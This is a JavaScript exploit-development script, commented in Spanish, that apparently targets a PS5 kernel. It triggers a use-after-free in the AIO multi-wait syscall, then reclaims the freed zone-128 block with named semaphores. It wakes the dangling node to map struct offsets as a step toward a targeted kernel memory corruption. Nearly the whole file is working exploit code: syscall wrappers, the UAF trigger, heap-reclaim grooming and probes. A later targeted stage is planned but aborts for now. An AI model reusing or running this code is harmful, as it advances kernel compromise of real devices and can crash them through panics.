// sim: hang-expected — el bucle final de notificacion/yield se cuelga a proposito (veredicto legible en consola).
// osem_conv_1320.js — fase de CONVERSION (paste BAGAGWA §4): de "detectamos el
// waker" a "dirigimos el dec". Doble-gated: NO invoca nada sin ?conv=<nivel>.
//   conv=0 (default): DRY — gates + plan + hipotesis, SIN disparar nada.
//   conv=1: EXPERIMENTO DE LAYOUT — dispara el UAF (mode 0 num=2), reclama con
//            osems de nombre con longitud creciente (1/8/16/31) y despierta.
//            La supervivencia + canales que se mueven delatan DONDE cae el
//            nombre dentro del struct (el strlcpy lo copia dentro) respecto
//            a los campos del nodo que lee el waker (+0 dec1, +8 dec2, +0x10
//            mtx, +0x20 write). Cada resultado es un byte de layout real.
//   conv=2: CONVERSION APUNTADA — REQUIERE primitiva de reclaim con contenido
//            BINARIO en zona 128 (aun desconocida: los nombres son ASCII y no
//            pueden codificar un puntero kernel, y strlcpy corta en NUL), la
//            direccion de la victima (leakmap) y la tabla de offsets (conv=1).
//            Sin prerrequisitos: aborta SIN invocar.
// RIESGO (conv>=1): identico al shot de bagagwa — el waker corre sobre el
// nodo colgante; si el contenido del bloque apunta a memoria no mapeada,
// panic -> reinicio (recoverable, sin brick). ?conv=1 una sola vez por boot.
(() => {
    const B = (x) => BigInt(x);
    const I = (x) => BigInt.asIntN(64, x);
    const Y = 331n;
    const say = (s) => { try { log("[conv] " + s); } catch (e) {} };
    const notif = (s) => { try { send_notification(("[conv] " + s).slice(0, 120)); } catch (e) {} };
    const EN = () => { try { const m = /^(\d+)/.exec(get_error_string()); return m ? parseInt(m[1], 10) : -1; } catch (e) { return -1; } };
    const ENX = { 9: "EBADF", 14: "EFAULT", 22: "EINVAL", 35: "EAGAIN", 78: "ENOSYS" };
    const FX = (v) => "0x" + B(v).toString(16);
    const VS = (q) => q.ex ? "EX(" + q.msg + ")" : (q.r >= 0n ? "ok0x" + q.r.toString(16) : "e" + q.e + (ENX[q.e] ? "(" + ENX[q.e] + ")" : ""));
    const VIVA = (q) => !q.ex && !(q.r === -1n && q.e === 78);
    const SC = (tag, sc, args, desc) => {
        const p = tag + (desc ? " " + desc : "") + " (" + args.map(FX).join(",") + ")";
        say(p + " ...");
        const o = { tag, r: -9999n, e: -1, ex: false, msg: "" };
        try { o.r = I(syscall(sc, ...args.map((a) => B(a)))); if (o.r < 0n) o.e = EN(); }
        catch (err) { o.ex = true; o.msg = String(err && err.message || err).slice(0, 60); say(p + " -> THREW " + o.msg); return o; }
        say(p + " -> " + (o.r >= 0n ? "ret=0x" + o.r.toString(16) + " OK" : o.r + " errno=" + o.e));
        return o;
    };

    // nivel de armado: ?conv= en consola; __PSAITO_CONV en sim (si la URL no
    // trae el param, el hook manda)
    let conv = 0;
    try {
        const q = new URLSearchParams(location.search);
        const c = parseInt(q.get("conv") || "", 10);
        if (Number.isFinite(c)) conv = c;
    } catch (e) {}
    try { if (!conv) conv = globalThis.__PSAITO_CONV || 0; } catch (e) {}
    if (conv > 2) conv = 2;

    const A_INIT = 0x29En, A_SUBCMD = 0x29Dn, A_WAIT = 0x297n;
    const A_CANCEL = 0x29An, A_DEL = 0x296n;
    const O_CREATE = 0x225n, O_DELETE = 0x226n, O_TRYWAIT = 0x22An, O_POST = 0x22Bn;
    const AIO_CMD_MULTI_READ = 0x1001n;
    const NREQ = 2, REQ_BYTES = 0x28, NRECLAIM = 4;

    say("begin - conversion lab pid=" + I(syscall(SYSCALL.getpid))
        + " fw=" + (PS5.fw || "?") + " conv=" + conv + (conv ? " (ARMED)" : " (DRY)"));

    // ===== F0: gates =====
    if (PS5.stubMode) {
        const stubs = (typeof SYSCALL_STUBS !== "undefined" && SYSCALL_STUBS) ? SYSCALL_STUBS : null;
        if (!stubs) { say("VERDICT: stubMode sin SYSCALL_STUBS -> abort"); notif("conv: no stubs"); return; }
        const need = [[663, "aio_multi_wait"], [669, "aio_submit_cmd"], [662, "aio_multi_delete"],
            [666, "aio_multi_cancel"], [549, "osem_create"], [550, "osem_delete"],
            [554, "osem_trywait"], [555, "osem_post"]];
        const miss = need.filter(([n]) => !stubs[String(n)]);
        if (miss.length) { say("VERDICT: missing stubs: " + miss.map(([n, nm]) => nm + "(" + n + ")").join(", ") + " -> abort"); return; }
        say("F0: stubs OK (727 via raw=" + (((typeof SYSCALL_RAW !== "undefined" && SYSCALL_RAW) || PS5.rawSyscall === true) ? "SI" : "NO — canal leak off") + ")");
    }
    const qInit = SC("AIO_INIT", A_INIT, [0n], "(flags=0)");
    if (!VIVA(qInit)) {
        say("VERDICT: AIO MUERTA -> la conversion necesita el UAF de 663; abort SIN invocar");
        notif("conv: AIO dead");
        return;
    }

    // ===== conv=0: DRY — plan e hipotesis, cero disparos =====
    if (conv === 0) {
        say("DRY: no se invoca nada. Plan:");
        say("  conv=1 EXPERIMENTO DE LAYOUT: 2 req AIO multi-read (socketpair) -> shot mode0");
        say("    num=2 -> reclaim 4 osems con nombres de longitud 1/8/16/31 -> wake -> leer canales.");
        say("  HIPOTESIS PRE-WAKE (que delata cada desenlace):");
        say("    sobrevive + 0 canales movidos  -> el nombre NO cae en +0/+8/+0x10 del struct (off >= 0x38)");
        say("    sobrevive + canales movidos     -> head tocado pero con objetivos benignos (mapear offsets)");
        say("    panic en el wake                -> el nombre pisa un campo dec/mtx (offset < 0x20): ADVERTIR");
        say("    hang en el wake                 -> mtx_lock sobre puntero vivo: bloqueo (offset +0x10 con ptr)");
        say("  conv=2 APUNTADA: requiere (1) primitiva de reclaim BINARIO en zona 128 [DESCONOCIDA:");
        say("    candidatos: buffers de socket/pipe copiados byte a byte, ipc, sysctl — el censo los delata],");
        say("    (2) direccion kernel de la victima [leakmap], (3) tabla de offsets [conv=1].");
        say("VERDICT: DRY OK — gates verdes; invocar con ?conv=1 para el experimento de layout");
        notif("conv: DRY ok");
        say("PAYLOAD DONE");
        return;
    }

    // ===== conv=2: apuntada — prerrequisitos =====
    if (conv === 2) {
        say("CONVERSION APUNTADA: prerrequisitos NO resueltos todavia:");
        say("  (1) primitiva de reclaim con contenido BINARIO en zona 128: los nombres osem son ASCII");
        say("      (no codifican punteros kernel: 0xffff8x...) y strlcpy corta en NUL -> el vector nombre");
        say("      NO sirve para apuntar el dec. Hay que encontrar la syscall que copia bytes crudos.");
        say("  (2) direccion kernel de la victima (osem+0x54) — salida del leakmap_1320.");
        say("  (3) offsets del struct confirmados por el experimento conv=1.");
        say("VERDICT: ABORT SIN INVOCAR (fase de diseno: cazar la primitiva binaria primero)");
        notif("conv: apuntada sin primitiva, abort");
        say("PAYLOAD DONE");
        return;
    }

    // ===== conv=1: EXPERIMENTO DE LAYOUT =====
    // F1: 2 requests AIO con lectura pendiente (socketpair) — como bagagwa
    say("F1: 2 AIO multi-read con lectura pendiente (socketpair)");
    const reqs = malloc(REQ_BYTES * NREQ);
    let fdTarget = 0n, fdPair = -1n;
    const sv = malloc(8);
    const qsp = SC("SOCKETPAIR", 0x35n, [1n, 1n, 0n, sv], "(AF_UNIX,SOCK_STREAM,0,sv)");
    if (qsp.r >= 0n) {
        fdTarget = BigInt(Number(read32(sv)));
        fdPair = Number(read32(sv + 4n));
    } else { say("F1: socketpair fallo (" + VS(qsp) + ") -> sin lectura pendiente el UAF no dispara; abort"); notif("conv: no socketpair"); return; }
    for (let i = 0; i < NREQ; i++) write32(reqs + BigInt(i * REQ_BYTES + 0x20), fdTarget);
    const ids = malloc(4 * NREQ), states = malloc(4 * NREQ);
    for (let i = 0; i < NREQ; i++) { write32(ids + BigInt(i * 4), 0n); write32(states + BigInt(i * 4), 0n); }
    const sub = SC("AIO_SUBMIT_CMD", A_SUBCMD, [AIO_CMD_MULTI_READ, reqs, B(NREQ), 3n, ids], "(MULTI_READ,reqs,2,prio3,ids)");
    if (sub.r < 0n) { say("F1: submit fallo (" + VS(sub) + ") -> abort"); notif("conv: submit fail"); return; }
    const idList = [];
    for (let i = 0; i < NREQ; i++) { const r = Number(read32(ids + BigInt(i * 4))); idList.push(r); say("F1 id[" + i + "]=" + FX(r)); }

    // F2: VICTIMA + CONTROL pre-shot (nunca caen en el bloque liberado)
    say("F2: victim + control osem pre-shot (estables, fuera de la zona 128 liberada)");
    const vicNm = alloc_string("VICTIM01"), ctlNm = alloc_string("CONTROL01");
    const qVic = SC("OSEM_CREATE_VICTIM", O_CREATE, [vicNm, 0n, 1n, 1n, 0n], "(victim)");
    const qCtl = SC("OSEM_CREATE_CONTROL", O_CREATE, [ctlNm, 0n, 1n, 1n, 0n], "(control)");
    if (qVic.r < 0n || qCtl.r < 0n) { say("F2: create fallo -> abort"); notif("conv: osem create fail"); return; }
    const vicId = qVic.r, ctlId = qCtl.r;
    const probe = (tag, id) => {
        const qp = SC("OSEM_POST_" + tag, O_POST, [id], "(id)");
        const qt = SC("OSEM_TRYWAIT_" + tag, O_TRYWAIT, [id], "(id)");
        return { code: qt.ex ? -100 : (qt.r >= 0n ? 0 : qt.e), p: VS(qp), t: VS(qt) };
    };
    const vicPre = probe("VIC_pre", vicId), ctlPre = probe("CTL_pre", ctlId);
    say("F2: victim=" + FX(vicId) + " pre=" + vicPre.code + " | control=" + FX(ctlId) + " pre=" + ctlPre.code);

    // F3: SHOT (identico a bagagwa: mode 0, num=2 — zona 128)
    notif("conv: firing mode 0 (layout experiment)");
    const det = SC("AIO_WAIT_MODE0", A_WAIT, [ids, B(NREQ), states, 0n, 0n], "(ids,2,states,mode0,0)");
    say("F3: shot=" + VS(det) + " <- vivo = el UAF no panico al armar");
    for (let i = 0; i < 200; i++) { try { syscall(Y); } catch (e) {} }

    // F4: reclaim con longitud de nombre creciente — el nucleo del experimento
    say("F4: reclaim x" + NRECLAIM + " con longitudes de nombre 1/8/16/31 (strlcpy dentro del struct)");
    const names = ["A", "Bbbbbbbb", "Cccccccccccccccc", "Ddddddddddddddddddddddddddddddd"];
    const recIds = [], recPre = [];
    for (let i = 0; i < NRECLAIM; i++) {
        const nm = alloc_string(names[i]);
        const q = SC("OSEM_CREATE_REC" + i, O_CREATE, [nm, 0n, 1n, 1n, 0n], "(len=" + names[i].length + ")");
        if (q.r >= 0n) { recIds.push(q.r); recPre.push(probe("REC" + i + "_pre", q.r)); }
        else recPre.push(null);
    }
    say("F4: pre-wake probes: " + recIds.map((id, i) => "R" + i + "=" + (recPre[i] ? recPre[i].code : "-")).join(" "));

    // F5: WAKE
    const wakeBuf = malloc(4);
    write8(wakeBuf, 0x57);
    say("F5: WAKE — si muere aqui, el nombre pisa un campo dec/mtx del nodo (layout: dato)");
    const qw = SC("WAKE_WRITE", 0x4n, [B(fdPair), wakeBuf, 1n], "(fdB,1 byte)");
    say("F5: wake=" + VS(qw) + " <- consola viva");
    for (let i = 0; i < 500; i++) { try { syscall(Y); } catch (e) {} }

    // F6: lectura post-wake
    const vicPost = probe("VIC_post", vicId), ctlPost = probe("CTL_post", ctlId);
    say("F6: victim " + vicPre.code + "->" + vicPost.code + " | control " + ctlPre.code + "->" + ctlPost.code);
    const recPost = recIds.map((id, i) => {
        const p = probe("REC" + i + "_post", id);
        const was = recPre[i] ? recPre[i].code : -1;
        say("F6: R" + i + " (len " + names[i].length + ") " + was + "->" + p.code);
        return { i, len: names[i].length, was, now: p.code };
    });
    const moved = recPost.filter((w) => w.now !== w.was);
    let v;
    if (vicPost.code !== vicPre.code) v = "VICTIMA ALTERADA (" + vicPre.code + "->" + vicPost.code + "): el dec callo en la victima — INESPERADO y valioso";
    else if (moved.length && ctlPost.code === ctlPre.code) v = "LAYOUT: sobrevive + " + moved.length + "/" + NRECLAIM + " reclaim movidos (lens " + moved.map((w) => w.len).join(",") + ") -> el waker leyo campos del struct; emparejar lens con offsets";
    else if (moved.length === 0 && ctlPost.code === ctlPre.code) v = "LAYOUT: sobrevive + 0 canales movidos -> o el reclaim no cayo en el bloque o el head no llega a los dec (nombre fuera de +0/+8)";
    else v = "LAYOUT: RUIDO (control movido) — sonda poco fiable en este kernel";
    say("VERDICT: " + v);
    notif("conv: " + v);
    // cleanup: reclamos VIVOS (double-free safety, como bagagwa); victim/control
    // se dejan tambien (sus refcounts pueden haber sido tocados por el dec).
    SC("AIO_MULTI_CANCEL", A_CANCEL, [ids, B(NREQ), states], "(ids,2,states)");
    SC("AIO_MULTI_DELETE", A_DEL, [ids, B(NREQ), states], "(ids,2,states)");
    if (fdTarget > 0n) { try { syscall(SYSCALL.close, fdTarget); } catch (e) {} }
    if (fdPair >= 0n) { try { syscall(SYSCALL.close, fdPair); } catch (e) {} }
    say("osems dejados vivos (double-free safety): victim " + FX(vicId) + " control " + FX(ctlId)
        + " reclaim " + recIds.map(FX).join(","));
    for (let i = 0; i < 8; i++) { notif("conv: " + v); for (let j = 0; j < 1000; j++) { try { syscall(Y); } catch (e) {} } }
    say("PAYLOAD DONE");
})();
